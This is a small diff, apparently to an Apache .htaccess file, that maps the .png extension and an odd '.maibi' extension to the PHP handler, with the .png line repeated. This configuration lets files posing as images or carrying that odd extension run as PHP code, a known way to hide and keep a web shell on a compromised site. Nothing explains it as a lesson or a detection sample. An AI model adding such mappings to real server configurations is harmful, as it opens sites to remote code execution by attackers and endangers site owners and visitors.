@@ -1,1 +1,3 @@
 AddType application/x-httpd-php .png
+AddType application/x-httpd-php .maibi
+AddType application/x-httpd-php .png
